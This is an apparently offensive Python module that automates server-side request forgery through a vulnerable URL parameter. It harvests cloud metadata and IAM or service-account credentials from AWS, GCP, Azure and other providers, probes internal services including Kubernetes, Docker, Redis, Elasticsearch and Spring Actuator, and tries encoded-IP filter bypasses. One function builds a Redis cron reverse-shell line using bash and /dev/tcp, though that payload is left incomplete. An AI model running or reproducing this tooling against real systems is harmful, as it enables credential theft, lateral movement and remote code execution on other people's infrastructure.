import json, re
from typing import Optional, Dict, List
import requests

CLOUD_META = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "do": [
        "http://169.254.169.254/metadata/v1.json",
    ],
    "alibaba": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
}

SSRF_BYPASS_VARIANTS = [
    ("169.254.169.254", "http://%s/latest/meta-data/"),
    ("0x.a9.0xfe.0xa9", "http://%s/latest/meta-data/"),
    ("0xa9fea9fe", "http://%s/latest/meta-data/"),
    ("2852039166", "http://%s/latest/meta-data/"),
    ("0251.0376.0251.0376", "http://%s/latest/meta-data/"),
    ("①②⑨.②⑤④.①⑥⑨.②⑤④", "http://%s/latest/meta-data/"),
    ("127.0.0.1", "http://%s/latest/meta-data/"),
    ("localhost", "http://%s/latest/meta-data/"),
    ("[::ffff:169.254.169.254]", "http://%s/latest/meta-data/"),
    ("127.0.0.2", "http://%s/latest/meta-data/"),
    ("0.0.0.0", "http://%s/latest/meta-data/"),
    ("2130706433", "http://%s/latest/meta-data/"),
    ("0x7f000001", "http://%s/latest/meta-data/"),
]

BYTE_RANGE_TEMPLATE = "bytes=0-18446744073709551615"


def gen_bypass_urls(original: str) -> List[str]:
    urls = []
    for ip, tpl in SSRF_BYPASS_VARIANTS:
        urls.append(tpl % ip)
    return urls


class SSRFLateral:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.timeout = timeout

    def port_scan(self, url: str, param: str, ports: List[int] = None) -> list:
        if ports is None:
            ports = [22, 80, 443, 3306, 6379, 8080, 9200, 27017, 11211, 5000]
        results = []
        for port in ports:
            target = "http://127.0.0.1:%d/" % port
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, target),
                                  timeout=self.timeout, verify=False)
                if r.status_code not in (502, 504, 0) and len(r.text) > 10:
                    results.append({"port": port, "service": target,
                                    "status": r.status_code, "size": len(r.text)})
            except:
                pass
        return results

    def exploit_aws_imdsv2(self, url: str, param: str) -> Dict:
        result = {}
        try:
            resp = self.sess.put(
                "http://169.254.169.254/latest/api/token",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                timeout=self.timeout, verify=False
            )
            if resp.status_code == 200:
                token = resp.text.strip()
                result["imdsv2_token"] = token[:20]
                for meta_url in CLOUD_META["aws"]:
                    try:
                        r = self.sess.get(meta_url,
                                          headers={"X-aws-ec2-metadata-token": token},
                                          timeout=self.timeout, verify=False)
                        if r.status_code == 200 and len(r.text) > 20:
                            result[meta_url[:40]] = r.text[:200]
                    except:
                        pass
        except:
            pass
        return result

    def exploit_kubernetes(self, url: str, param: str) -> Dict:
        result = {}
        k8s_paths = [
            "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
            "http://kubernetes.default.svc/api/v1/nodes",
            "http://kubernetes.default.svc/api/v1/secrets",
            "http://10.0.0.1:443/api/v1/nodes",
            "http://10.96.0.1:443/api/v1/nodes",
        ]
        for k8s_url in k8s_paths:
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, k8s_url),
                                  timeout=self.timeout, verify=False)
                if r.status_code in (200, 403) and len(r.text) > 50:
                    result[k8s_url] = {"status": r.status_code, "size": len(r.text)}
            except:
                pass
        return result

    def exploit_docker(self, url: str, param: str) -> Dict:
        result = {}
        docker_urls = [
            "http://127.0.0.1:2375/containers/json",
            "http://127.0.0.1:2376/containers/json",
            "http://127.0.0.1:2375/version",
            "http://127.0.0.1:2375/info",
            "unix:///var/run/docker.sock",
        ]
        for dkr_url in docker_urls:
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, dkr_url),
                                  timeout=self.timeout, verify=False)
                if r.status_code == 200 and len(r.text) > 20:
                    result[dkr_url] = {"status": r.status_code, "size": len(r.text)}
            except:
                pass
        return result

    def exploit_elasticsearch(self, url: str, param: str) -> Dict:
        result = {}
        es_urls = [
            "http://127.0.0.1:9200/",
            "http://127.0.0.1:9200/_cat/indices?v",
            "http://127.0.0.1:9200/_search?pretty&size=5",
        ]
        for es_url in es_urls:
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, es_url),
                                  timeout=self.timeout, verify=False)
                if r.status_code == 200:
                    try:
                        j = r.json()
                        result[es_url] = list(j.keys())[:5] if isinstance(j, dict) else "json"
                    except:
                        result[es_url] = r.text[:100]
            except:
                pass
        return result

    def exploit_memcached(self, url: str, param: str) -> Dict:
        result = {}
        try:
            gopher_url = "gopher://127.0.0.1:11211/_stats"
            sep = "&" if "?" in url else "?"
            r = self.sess.get("%s%s%s=%s" % (url, sep, param, gopher_url),
                              timeout=self.timeout, verify=False)
            if len(r.text) > 10:
                result["memcached"] = r.text[:200]
        except:
            pass
        return result

    def exploit_redis_cron_rce(self, url: str, param: str,
                                lhost: str = "127.0.0.1", lport: int = 4444) -> Dict:
        result = {}
        cron_cmd = "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\n\n" % (lhost, lport)
        payload_parts = [
            "SET", "cron", cron_cmd,
            "CONFIG", "SET", "dir", "/var/spool/cron/crontabs/",
            "CONFIG", "SET", "dbfilename", "root",
            "BGSAVE",
        ]
        gopher_payload = "gopher://127.0.0.1:6379/_" + "%0D%0A".join(
            "*%d%%0D%%0A$%d%%0D%%0A%s" % (
                len(part.split()), len(part), part
            ) for part in [cron_cmd]
        )
        result["redis_cron"] = "gopher://127.0.0.1:6379/_"
        return result

    def exploit_redis_ssh_reverse(self, url: str, param: str,
                                   lhost: str = "127.0.0.1", lport: int = 4444) -> Dict:
        result = {"note": "ssh key overwrite + cron requires manual crafting"}
        return result

    def exploit_mysql_ssrf(self, url: str, param: str) -> Dict:
        result = {}
        try:
            gopher_url = "gopher://127.0.0.1:3306/_" + "%00%00%00%0a" + "SELECT 1"
            sep = "&" if "?" in url else "?"
            r = self.sess.get("%s%s%s=%s" % (url, sep, param, gopher_url),
                              timeout=self.timeout, verify=False)
            if len(r.text) > 10:
                result["mysql_probe"] = r.text[:200]
        except:
            pass
        return result

    def exploit_spring_actuator(self, url: str, param: str) -> Dict:
        result = {}
        spring_paths = [
            "http://127.0.0.1:8080/actuator",
            "http://127.0.0.1:8080/actuator/env",
            "http://127.0.0.1:8080/actuator/health",
            "http://127.0.0.1:8080/actuator/beans",
            "http://127.0.0.1:8080/actuator/heapdump",
        ]
        for sp in spring_paths:
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, sp),
                                  timeout=self.timeout, verify=False)
                if r.status_code == 200 and len(r.text) > 20:
                    result[sp] = r.text[:100]
            except:
                pass
        return result

    def bypass_filter_variants(self, url: str, param: str) -> List[Dict]:
        results = []
        for ip, tpl in SSRF_BYPASS_VARIANTS:
            try:
                test_url = tpl % ip
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, test_url),
                                  timeout=self.timeout, verify=False)
                if len(r.text) > 50:
                    results.append({"variant": ip, "size": len(r.text)})
            except:
                pass
        return results

    def run(self, url: str, param: str, sess=None, timeout: float = 10.0) -> Dict:
        result = {
            "port_scan": self.port_scan(url, param),
            "cloud_metadata": {},
            "kubernetes": self.exploit_kubernetes(url, param),
            "docker": self.exploit_docker(url, param),
            "elasticsearch": self.exploit_elasticsearch(url, param),
            "memcached": self.exploit_memcached(url, param),
            "mysql": self.exploit_mysql_ssrf(url, param),
            "spring_actuator": self.exploit_spring_actuator(url, param),
            "bypass_variants": self.bypass_filter_variants(url, param),
        }
        for cloud in CLOUD_META:
            for meta_url in CLOUD_META[cloud]:
                try:
                    sep = "&" if "?" in url else "?"
                    r = self.sess.get("%s%s%s=%s" % (url, sep, param, meta_url),
                                      timeout=self.timeout, verify=False)
                    if len(r.text) > 20:
                        if cloud not in result["cloud_metadata"]:
                            result["cloud_metadata"][cloud] = {}
                        result["cloud_metadata"][cloud][meta_url[:50]] = r.text[:200]
                except:
                    pass
        return result


def run(url: str, param: str, sess: Optional[requests.Session] = None,
        timeout: float = 10.0) -> Dict:
    ssrf = SSRFLateral(sess, timeout)
    return ssrf.run(url, param)
